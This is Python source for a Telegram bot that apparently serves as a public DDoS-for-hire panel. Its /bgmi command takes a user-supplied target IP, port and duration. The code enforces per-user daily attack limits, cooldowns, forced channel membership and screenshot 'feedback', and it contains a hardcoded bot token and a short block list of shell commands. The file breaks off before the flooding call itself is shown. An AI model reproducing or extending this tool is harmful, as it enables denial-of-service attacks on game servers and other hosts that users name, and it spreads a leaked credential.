import telebot
import logging
import asyncio
from datetime import datetime, timedelta, timezone
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, KeyboardButton
import os

# Initialize logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

BLOCKED_COMMANDS = ["nano", "sudo", "rm", "rm -rf", "screen"]

TOKEN = '7956789514:AAGxj-xIj_wfkYMX-qniQOewRtyLKcMWXko'  # Replace with your actual bot token
ADMIN_IDS = [1549748318]  # Added new admin ID
CHANNEL_ID = '-1002654300042'  # Replace with your specific channel or group ID

bot = telebot.TeleBot(TOKEN)

# Dictionary to track user attack counts, cooldowns, photo feedbacks, and bans
user_attacks = {}
user_cooldowns = {}
user_photos = {}  # Tracks whether a user has sent a photo as feedback
user_bans = {}  # Tracks user ban status and ban expiry time
reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=10))).replace(hour=0, minute=0, second=0, microsecond=0)

# Cooldown duration (in seconds)
COOLDOWN_DURATION = 300  # 5 minutes
BAN_DURATION = timedelta(minutes=1)  
DAILY_ATTACK_LIMIT = 15  # Daily attack limit per user

# List of user IDs exempted from cooldown, limits, and photo requirements
EXEMPTED_USERS = [7460924747, 1662672529]


def reset_daily_counts():
    """Reset the daily attack counts and other data at 12 AM IST."""
    global reset_time
    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=10)))
    if ist_now >= reset_time + timedelta(days=1):
        user_attacks.clear()
        user_cooldowns.clear()
        user_photos.clear()
        user_bans.clear()
        reset_time = ist_now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)


# Function to validate IP address
def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

# Function to validate port number
def is_valid_port(port):
    return port.isdigit() and 0 <= int(port) <= 65535

# Function to validate duration
def is_valid_duration(duration):
    return duration.isdigit() and int(duration) > 0

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "User"

    # ✅ **Fetch user profile picture**
    has_photo = False
    try:
        photos = bot.get_user_profile_photos(user_id)
        if photos.total_count > 0:
            has_photo = True
            photo_file_id = photos.photos[0][0].file_id  # ✅ First photo ka File ID
    except Exception as e:
        print(f"Error fetching profile photo: {e}")  # ✅ Error handle karega

    # ✅ **Stylish Welcome Message**
    welcome_text = (
        f"👋🏻 *𝗪𝗘𝗟𝗖𝗢𝗠𝗘, {user_name}!* 🔥\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🤖 *𝗧𝗛𝗜𝗦 𝗜𝗦 𝗧𝗙_RAJ 𝗕𝗢𝗧!*\n"
        f"🆔 **User ID:** `{user_id}`\n"
        "📢 *𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹:*\n"
        "[➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖](https://t.me/RAJOWNER9090)\n\n"
        "📌 *𝗧𝗿𝘆 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱:*\n"
        "`/bgmi` - 🚀 *Start an attack!*\n\n"
        "👑 *𝗕𝗢𝗧 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 𝗕𝗬:* [@RAJOWNER90](https://t.me/RAJOWNER90) 💀"
    )

    # ✅ **Inline Buttons**
    inline_keyboard = InlineKeyboardMarkup()
    inline_keyboard.add(
        InlineKeyboardButton("[➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖]", url="https://t.me/RAJOWNER9090")
    )
    inline_keyboard.add(
        InlineKeyboardButton("👑 𝗕𝗢𝗧 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 𝗕𝗬 👑", url="https://t.me/RAJOWNER90")
    )


    # ✅ **Send message with or without profile photo**
    try:
        if has_photo:
            bot.send_photo(
                message.chat.id, photo_file_id,
                caption=welcome_text,
                parse_mode="Markdown",
                reply_markup=inline_keyboard
            )
        else:
            bot.send_message(
                message.chat.id, welcome_text,
                parse_mode="Markdown",
                disable_web_page_preview=True,
                reply_markup=inline_keyboard
            )

        # ✅ **Send Terminal Button after Welcome Message**
        bot.send_message(message.chat.id, "🔹 **Use the menu below:**", reply_markup=reply_keyboard, parse_mode="Markdown")

    except Exception as e:
        print(f"Error sending message: {e}")  # ✅ Error handling
        bot.send_message(
            message.chat.id, "❌ Error displaying welcome message.",
            parse_mode="Markdown"
        )

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = (
        "╔═════ ❰ 𝗧𝗙_𝗙𝗟𝗔𝗦𝗛 𝗕𝗢𝗧 ❱ ═════╗\n\n"
        "🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:\n"
        "┣➤ 〘 `/bgmi <target_ip> <port> <duration>` 〙– 🔥 **Start an Attack**\n\n"
        "📊 𝗦𝘁𝗮𝘁𝘂𝘀 & 𝗜𝗻𝗳𝗼:\n"
        "┣➤ 〘 `/status` 〙– 🕒 **Check Remaining Attacks & Cooldown**\n"
        "┣➤ 〘 `/reset_TF` 〙– ⚠️ *(Admin Only)* **Reset Attack Limits**\n\n"
        "🔗 𝗢𝘁𝗵𝗲𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:\n"
        "┣➤ 〘 `/start` 〙– 👋 **Bot Introduction & Welcome**\n"
        "┣➤ 〘 `/help` 〙– 📜 **Show This Help Menu**\n\n"
        "╚═════ ❰ ‼️🇩 🇦 🇷 🇰  🇽  🇸 🇪 🇷 🇻 🇪 🇷  ™ ‼️! ❱ ═════╝"
    )

    bot.reply_to(message, help_text, parse_mode="Markdown")


# PAPA TF_FLASH92
# 🛡️ 『 𝑺𝒕𝒂𝒕𝒖𝒔 𝑪𝒐𝒎𝒎𝒂𝒏𝒅 』🛡️

attack_end_time = None

@bot.message_handler(commands=['status'])
def status_command(message):
    global attack_end_time, attack_running
    
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "🚀 VIP User"

    remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
    remaining_ban_time = max(0, int((user_bans.get(user_id, datetime.min) - datetime.now()).total_seconds())) if user_id in user_bans else 0
    remaining_cooldown = max(0, int((user_cooldowns.get(user_id, datetime.min) - datetime.now()).total_seconds())) if user_id in user_cooldowns else 0
    attack_remaining_time = max(0, int((attack_end_time - datetime.now()).total_seconds())) if attack_running and attack_end_time else 0

    status_msg = bot.send_message(
        message.chat.id,
        "🔍 Checking status... ⏳"
    )

    while remaining_cooldown > 0 or remaining_ban_time > 0 or attack_remaining_time > 0:
        ban_minutes, ban_seconds = divmod(remaining_ban_time, 60)
        cooldown_minutes, cooldown_seconds = divmod(remaining_cooldown, 60)
        attack_minutes, attack_seconds = divmod(attack_remaining_time, 60)

        ban_status = f"🚫 BANNED: {ban_minutes} min {ban_seconds} sec ⛔" if remaining_ban_time > 0 else "✅ NOT BANNED 🟢"
        cooldown_status = f"🕒 COOLDOWN: {cooldown_minutes} min {cooldown_seconds} sec ⏳" if remaining_cooldown > 0 else "✅ NO COOLDOWN 🔥"
        attack_status = f"⚡ ATTACK REMAINING: {attack_minutes} min {attack_seconds} sec 🚀" if attack_remaining_time > 0 else "✅ NO ATTACK RUNNING 🛡️"

        status_text = (
            f"╔════════════════════════╗\n"
            f"      🎯 VIP USER STATUS 🎯\n"
            f"╚════════════════════════╝\n\n"
            f"👑 USER:  {user_name}\n"
            f"🆔 USER ID:  {user_id}\n\n"
            f"💥 REMAINING ATTACKS:  {remaining_attacks}/{DAILY_ATTACK_LIMIT} ⚡\n\n"
            f"{ban_status}\n"
            f"{cooldown_status}\n"
            f"{attack_status}\n\n"
            f"🔄 POWERED BY: 🇩 🇦 🇷 🇰  🇽  🇸 🇪 🇷 🇻 🇪 🇷  ™ 🚀"
        )

        try:
            bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text=status_text)
            time.sleep(3)  # ✅ **Now updates every 3 seconds instead of every second**
        except telebot.apihelper.ApiTelegramException as e:
            if "429" in str(e):
                retry_after = int(str(e).split("retry after ")[-1].split("\n")[0])  # Extract retry time
                bot.send_message(message.chat.id, f"⚠️ Too Many Requests! Retrying after {retry_after} sec... ⏳")
                time.sleep(retry_after)  # **Bot will wait and retry after given time**
                continue
            else:
                bot.send_message(message.chat.id, f"❌ ERROR: {e}")
                break

        remaining_ban_time = max(0, remaining_ban_time - 3)
        remaining_cooldown = max(0, remaining_cooldown - 3)
        attack_remaining_time = max(0, attack_remaining_time - 3)

    final_text = (
        f"╔════════════════════════╗\n"
        f"      🎯 FINAL STATUS 🎯\n"
        f"╚════════════════════════╝\n\n"
        f"👑 USER:  {user_name}\n"
        f"🆔 USER ID:  {user_id}\n\n"
        f"💥 REMAINING ATTACKS:  {remaining_attacks}/{DAILY_ATTACK_LIMIT} ⚡\n\n"
        f"✅ NO BAN 🟢\n"
        f"✅ NO COOLDOWN 🔥\n"
        f"✅ NO ATTACK RUNNING 🛡️\n\n"
        f"🔥 YOU ARE READY TO ATTACK! 🚀"
    )

    bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text=final_text)


# 🔄 『 𝑹𝒆𝒔𝒆𝒕 𝑨𝒕𝒕𝒂𝒄𝒌 𝑳𝒊𝒎𝒊𝒕𝒔 』🔄

@bot.message_handler(commands=['reset_RAJ'])
def reset_attack_limits(message):
    user_id = message.from_user.id

    # 🛑 Only Admins Can Use This Command
    if user_id not in ADMIN_IDS:
        bot.reply_to(
            message, 
            "╔═══❰ 🚫 **𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗!** 🚫 ❱═══╗\n\n"
            "💀 *𝐁𝐄𝐓𝐀, 𝐓𝐔 𝐀𝐃𝐌𝐈𝐍 𝐍𝐀𝐇𝐈 𝐇𝐀𝐈!* 💀\n"
            "🚷 **𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝘿𝙚𝙣𝙞𝙚𝙙 𝙛𝙤𝙧 𝙍𝙚𝙨𝙚𝙩!** 🚷\n\n"
            "⚠️ *𝗢𝗻𝗹𝘆 🇷 🇦 🇯  𝗟𝗼𝗿𝗱𝘀 𝗖𝗮𝗻 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱!*",
            parse_mode="Markdown"
        )
        return

    # 🔄 Send Initial Loading Message
    loading_msg = bot.reply_to(
        message, 
        "🟢 **𝗜𝗡𝗜𝗧𝗜𝗔𝗟𝗜𝗭𝗜𝗡𝗚 𝗦𝗬𝗦𝗧𝗘𝗠 𝗥𝗘𝗦𝗘𝗧...** ⏳",
        parse_mode="Markdown"
    )

    # 🔄 Simulate Hacking Style Loading Effect
    loading_steps = [
        "🔹 **𝗘𝗿𝗮𝘀𝗶𝗻𝗴 𝗔𝘁𝘁𝗮𝗰𝗸 𝗟𝗼𝗴𝘀...** 🗑️",
        "🔹 **𝗥𝗲𝗺𝗼𝘃𝗶𝗻𝗴 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻𝘀...** ❌",
        "🔹 **𝗥𝗲𝘀𝗲𝘁𝘁𝗶𝗻𝗴 𝗦𝗬𝗦𝗧𝗘𝗠 𝗟𝗜𝗠𝗜𝗧𝗦...** ⚙️",
        "🔹 **𝗢𝗽𝘁𝗶𝗺𝗶𝘇𝗶𝗻𝗴 𝗧𝗙 𝗕𝗢𝗧...** 🔧",
        "🔹 **𝗦𝗬𝗦𝗧𝗘𝗠 𝗥𝗘𝗦𝗘𝗧 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘!** ✅"
    ]

    for step in loading_steps:
        time.sleep(1)  # Wait for 1 second before updating message
        bot.edit_message_text(chat_id=message.chat.id, message_id=loading_msg.message_id, text=step, parse_mode="Markdown")

    # 🔄 Reset All Attack Data
    global user_attacks, user_cooldowns
    user_attacks.clear()
    user_cooldowns.clear()

    # ✅ Final Admin Confirmation Message
    bot.edit_message_text(
        chat_id=message.chat.id, 
        message_id=loading_msg.message_id, 
        text=(
            "╔══════ 🔥 **𝙍𝙀𝙎𝙀𝙏 𝘾𝙊𝙈𝙋𝙇𝙀𝙏𝙀!** 🔥 ══════╗\n\n"
            "⚡ *𝐀𝐥𝐥 𝐚𝐭𝐭𝐚𝐜𝐤 𝐥𝐢𝐦𝐢𝐭𝐬, 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧𝐬 & 𝐛𝐚𝐧𝐬 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐰𝐢𝐩𝐞𝐝!* ⚡\n\n"
            "🎯 **🇷 🇦 🇯  𝗦𝗬𝗦𝗧𝗘𝗠 𝗦𝗧𝗔𝗧𝗨𝗦:**\n"
            "✅ *𝐅𝐮𝐥𝐥 𝐏𝐨𝐰𝐞𝐫 𝐑𝐞𝐬𝐭𝐨𝐫𝐞𝐝! 𝐑𝐞𝐚𝐝𝐲 𝐭𝐨 𝐀𝐭𝐭𝐚𝐜𝐤!* 🚀\n\n"
            "💀 *𝙋𝙤𝙬𝙚𝙧 𝘽𝙚𝙡𝙤𝙣𝙜𝙨 𝙏𝙤 𝙏𝙝𝙚 𝙇𝙤𝙧𝙙𝙨!* 💀\n"
            "╚══════════════════════════╝"
        ),
        parse_mode="Markdown"
    )

# Handler for photos sent by users (feedback received)
# Define the feedback channel ID
FEEDBACK_CHANNEL_ID = "-1002095725114"  # Replace with your actual feedback channel ID

# Store the last feedback photo ID for each user to detect duplicates
last_feedback_photo = {}

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    photo_id = message.photo[-1].file_id  # Get the latest photo ID

    # Check if the user has sent the same feedback before & give a warning
    if last_feedback_photo.get(user_id) == photo_id:
        response = (
            "⚠️🚨 *『 𝗪𝗔𝗥𝗡𝗜𝗡𝗚: SAME 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞! 』* 🚨⚠️\n\n"
            "🛑 *𝖸𝖮𝖴 𝖧𝖠𝖵𝖤 𝖲𝖤𝖭𝖳 𝖳𝖧𝖨𝖲 𝖥𝖤𝖤𝖣𝖡𝖠𝖢𝖪 𝘽𝙀𝙁𝙊𝙍𝙀!* 🛑\n"
            "📩 *𝙋𝙇𝙀𝘼𝙎𝙀 𝘼𝙑𝙊𝙄𝘿 𝙍𝙀𝙎𝙀𝙉𝘿𝙄𝙉𝙂 𝙏𝙃𝙀 𝙎𝘼𝙈𝙀 𝙋𝙃𝙊𝙏𝙊.*\n\n"
            "✅ *𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝙒𝙄𝙇𝙇 𝙎𝙏𝙄𝙇𝙇 𝘽𝙀 𝙎𝙀𝙉𝙏!*"
        )
        response = bot.reply_to(message, response)

    # ✅ Store the new feedback ID (this ensures future warnings)
    last_feedback_photo[user_id] = photo_id
    user_photos[user_id] = True  # Mark feedback as given

    # ✅ Stylish Confirmation Message for User
    response = (
        "✨『 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲 𝑺𝑼𝑪𝑪𝑬𝑺𝑺𝑭𝑼𝑳𝑳𝒀 𝑹𝑬𝑪𝑬𝑰𝑽𝑬𝑫! 』✨\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"👤 *𝙁𝙍𝙊𝙈 𝙐𝙎𝙀𝙍:* @{username} 🏆\n"
        "📩 𝙏𝙃𝘼𝙉𝙆 𝙔𝙊𝙐 𝙁𝙊𝙍 𝙎𝙃𝘼𝙍𝙄𝙉𝙂 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆!🎉\n"
        "━━━━━━━━━━━━━━━━━━━"
    )
    response = bot.reply_to(message, response)

    # 🔥 Forward the photo to all admins
    for admin_id in ADMIN_IDS:
        bot.forward_message(admin_id, message.chat.id, message.message_id)
        admin_response = (
            "🚀🔥 *『 𝑵𝑬𝑾 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲 𝑹𝑬𝑪𝑬𝑰𝑽𝑬𝑫! 』* 🔥🚀\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            f"👤 *𝙁𝙍𝙊𝙈 𝙐𝙎𝙀𝙍:* @{username} 🛡️\n"
            f"🆔 *𝙐𝙨𝙚𝙧 𝙄𝘿:* `{user_id}`\n"
            "📸 *𝙏𝙃𝘼𝙉𝙆 𝙔𝙊𝙐 𝙁𝙊𝙍 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆!!* ⬇️\n"
            "━━━━━━━━━━━━━━━━━━━"
        )
        bot.send_message(admin_id, admin_response)

    # 🎯 Forward the photo to the feedback channel
    bot.forward_message(FEEDBACK_CHANNEL_ID, message.chat.id, message.message_id)
    channel_response = (
        "🌟🎖️ *『 𝑵𝑬𝑾 𝑷𝑼𝑩𝑳𝑰𝑪 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲! 』* 🎖️🌟\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"👤 *𝙁𝙍𝙊𝙈 𝙐𝙎𝙀𝙍:* @{username} 🏆\n"
        f"🆔 *𝙐𝙨𝙚𝙧 𝙄𝘿:* `{user_id}`\n"
        "📸 *𝙐𝙎𝙀𝙍 𝙃𝘼𝙎 𝙎𝙃𝘼𝙍𝙀𝘿 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆.!* 🖼️\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "📢 *𝙆𝙀𝙀𝙋 𝙎𝙐𝙋𝙋𝙊𝙍𝙏𝙄𝙉𝙂 & 𝙎𝙃𝘼𝙍𝙄𝙉𝙂 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆!* 💖"
    )
    bot.send_message(FEEDBACK_CHANNEL_ID, channel_response)


# Track if an attack is currently running
attack_running = False  # ✅ Ek time pe sirf ek attack allow karega

@bot.message_handler(commands=['bgmi'])
def bgmi_command(message):
    global attack_running, user_cooldowns, user_photos, user_bans
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "Unknown"
    required_channel = FEEDBACK_CHANNEL_ID  # Replace with your actual channel ID




    try:
        user_status = bot.get_chat_member(required_channel, user_id).status
        if user_status not in ["member", "administrator", "creator"]:
            
            # 🔹 Inline Button for Joining Channel
            keyboard = InlineKeyboardMarkup()
            join_button = InlineKeyboardButton("➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖", url="https://t.me/RAJOWNER9090")
            keyboard.add(join_button)

            try:
                # ✅ Fetch user profile photo
                photos = bot.get_user_profile_photos(user_id)

                if photos.total_count > 0:
                    photo_file_id = photos.photos[0][0].file_id  # ✅ User ki latest DP

                    # ✅ Send message with DP + Button (FIXED)
                    bot.send_photo(
                        message.chat.id,
                        photo_file_id,
                        caption=(
                            f"👤 **User:** `{message.from_user.first_name}`\n\n"
                            " *‼️🇩 🇦 🇷 🇰 🇽 🇸 🇪 🇷 🇻 🇪 🇷 ™ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗‼️* \n\n"
                            "📢 *LET'S GO AND JOIN CHANNEL*\n\n"
                            f" [➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖](https://t.me/RAJOWNER9090)\n\n"
                            " *‼️𝗔𝗳𝘁𝗲𝗿 𝗷𝗼𝗶𝗻𝗶𝗻𝗴, 𝘁𝗿𝘆 𝘁𝗵𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 /bgmi 𝗮𝗴𝗮𝗶𝗻‼️*"
                        ),
                        parse_mode="Markdown",
                        reply_markup=keyboard  # ✅ Add Inline Button
                    )
                else:
                    raise Exception("User ke paas DP nahi hai.")  # **Agar DP nahi hai toh error throw karenge**

            except Exception as e:
                # ❌ Agar DP fetch nahi ho rahi, toh normal message bhejo (FIXED)
                bot.send_message(
                    message.chat.id,
                    f"⚠️ **DP Error:** {e}\n\n"
                    " *‼️🇩 🇦 🇷 🇰 🇽 🇸 🇪 🇷 🇻 🇪 🇷 ™ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗‼️* \n\n"
                    "📢 *LET'S GO AND JOIN CHANNEL*\n\n"
                    f" [➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖](https://t.me/RAJOWNER9090)\n\n"
                    " *‼️𝗔𝗳𝘁𝗲𝗿 𝗷𝗼𝗶𝗻𝗶𝗻𝗴, 𝘁𝗿𝘆 𝘁𝗵𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 /bgmi 𝗮𝗴𝗮𝗶𝗻‼️*",
                    parse_mode="Markdown",
                    disable_web_page_preview=True,  # ✅ Yeh sirf send_message() me hoga, send_photo() me nahi
                    reply_markup=keyboard  
                )

            return

    except Exception as e:
        bot.send_message(
            message.chat.id,
            f"⚠️ *Error checking channel membership: {e}*"
        )
        return



    # Add your existing attack execution logic here...

    if attack_running:  # ✅ Pehle se attack chal raha ho toh error message dega
        bot.reply_to(message, "🚨🔥 『  𝘼𝙏𝙏𝘼𝘾𝙆 𝘾𝙃𝘼𝙇 𝙍𝙃𝘼 𝙃𝘼𝙄! 』🔥🚨\n\n⚠️ 𝗕𝗘𝗧𝗔 𝗦𝗔𝗕𝗥 𝗞𝗔𝗥! 😈💥\n\n🔄 ATTACK KHATAM HOTE HI TERA LAGA DE! 💥💣.")
        return


    # Ensure the bot only works in the specified channel or group
    if str(message.chat.id) != CHANNEL_ID:
        bot.send_message(message.chat.id, " ⚠️⚠️ 𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗶𝘀 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗵𝗲𝗿𝗲 ⚠️⚠️ \n\n[ 𝗕𝗢𝗧 𝗠𝗔𝗗𝗘 𝗕𝗬 : @RAJOWNER90 ( TUMHARE_PAPA ) | ]")
        return

    # Reset counts daily
    reset_daily_counts()

    # Check if the user is banned
    if user_id in user_bans:
        ban_expiry = user_bans[user_id]
        if datetime.now() < ban_expiry:
            remaining_ban_time = (ban_expiry - datetime.now()).total_seconds()
            minutes, seconds = divmod(remaining_ban_time, 10)
            bot.send_message(
                message.chat.id,
                f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙤𝙧 𝙣𝙤𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙞𝙣𝙜 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {int(minutes)} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {int(seconds)} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 !  ⚠️⚠️"
            )
            return
        else:
            del user_bans[user_id]  # Remove ban after expiry


    # Check if user is exempted from cooldowns, limits, and feedback requirements
    if user_id not in EXEMPTED_USERS:
        # Check if user is in cooldown
        if user_id in user_cooldowns:
            cooldown_time = user_cooldowns[user_id]
            if datetime.now() < cooldown_time:
                remaining_time = (cooldown_time - datetime.now()).seconds
                bot.send_message(
                    message.chat.id,
                    f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙘𝙪𝙧𝙧𝙚𝙣𝙩𝙡𝙮 𝙤𝙣 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {remaining_time // 10} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {remaining_time % 10} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 ⚠️⚠️ "
                )
                return

        # Check attack count
        if user_id not in user_attacks:
            user_attacks[user_id] = 0

        if user_attacks[user_id] >= DAILY_ATTACK_LIMIT:
            bot.send_message(
                message.chat.id,
                f"𝙃𝙞 {message.from_user.first_name}, 𝙮𝙤𝙪 𝙝𝙖𝙫𝙚 𝙧𝙚𝙖𝙘𝙝𝙚𝙙 𝙩𝙝𝙚 𝙢𝙖𝙭𝙞𝙢𝙪𝙢 𝙣𝙪𝙢𝙗𝙚𝙧 𝙤𝙛 𝙖𝙩𝙩𝙖𝙘𝙠-𝙡𝙞𝙢𝙞𝙩 𝙛𝙤𝙧 𝙩𝙤𝙙𝙖𝙮, 𝘾𝙤𝙢𝙚𝘽𝙖𝙘𝙠 𝙏𝙤𝙢𝙤𝙧𝙧𝙤𝙬 ✌️"
            )
            return

        # Check if the user has provided feedback after the last attack
        if user_id in user_attacks and user_attacks[user_id] > 0 and not user_photos.get(user_id, False):
            user_bans[user_id] = datetime.now() + BAN_DURATION  # Ban user for 2 hours
            bot.send_message(
                message.chat.id,
                f"𝙃𝙞 {message.from_user.first_name}, ⚠️⚠️𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙖𝙛𝙩𝙚𝙧 𝙮𝙤𝙪𝙧 𝙡𝙖𝙨𝙩 𝙖𝙩𝙩𝙖𝙘𝙠. 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙧𝙤𝙢 𝙪𝙨𝙞𝙣𝙜 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙧 10 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 ⚠️⚠️"
            )
            return

    # Split the command to get parameters
    try:
        args = message.text.split()[1:]  # Skip the command itself
        logging.info(f"Received arguments: {args}")

        if len(args) != 3:
            raise ValueError("🇩 🇦 🇷 🇰 🇽 🇸 🇪 🇷 🇻 🇪 🇷 ™ 𝗣𝗨𝗕𝗟𝗶𝗖 𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅ \n\n⚙ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙛𝙤𝙧𝙢𝙖𝙩 \n /bgmi <𝘁𝗮𝗿𝗴𝗲𝘁_𝗶𝗽> <𝘁𝗮𝗿𝗴𝗲𝘁_𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")

        target_ip, target_port, user_duration = args

        # Validate inputs
        if not is_valid_ip(target_ip):
            raise ValueError("Invalid IP address.")
        if not is_valid_port(target_port):
            raise ValueError("Invalid port number.")
        if not is_valid_duration(user_duration):
            raise ValueError("Invalid duration. Must be a positive integer.")

        # Increment attack count for non-exempted users
        if user_id not in EXEMPTED_USERS:
            user_attacks[user_id] += 1
            user_photos[user_id] = False  # Reset photo feedback requirement

        # Set cooldown for non-exempted users
        if user_id not in EXEMPTED_USERS:
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)

        # Notify that the attack will run for the default duration of 150 seconds, but display the input duration
        default_duration = 125
        attack_running = True
        
        remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
        
        user_info = message.from_user
        username = user_info.username if user_info.username else user_info.first_name
        bot.send_message(
    message.chat.id,
    f"╔════════════════════════════════╗\n"
    f"║ 🚀 **🇷 🇦 🇯 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗!** 🚀 ║\n"
    f"╚════════════════════════════════╝\n\n"
    f"🔥 **𝗔𝗧𝗧𝗔𝗖𝗞𝗘𝗥:** 🎭 `{message.from_user.first_name}`\n"
    f"🏆 **𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘:** `@{username}`\n\n"
    f"🎯 **𝗧𝗔𝗥𝗚𝗘𝗧 𝗗𝗘𝗧𝗔𝗜𝗟𝗦:**\n"
    f"╔═════════════════════════════╗\n"
    f"║ 🎯 **𝗧𝗔𝗥𝗚𝗘𝗧 𝗜𝗣:** `{target_ip} : {target_port}`\n"
    f"║ ⏳ **𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡:** `{default_duration} sec`\n"
    f"║ 🔥 **𝗜𝗡𝗣𝗨𝗧 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡:** `{user_duration} sec`\n"
    f"╚═════════════════════════════╝\n\n"
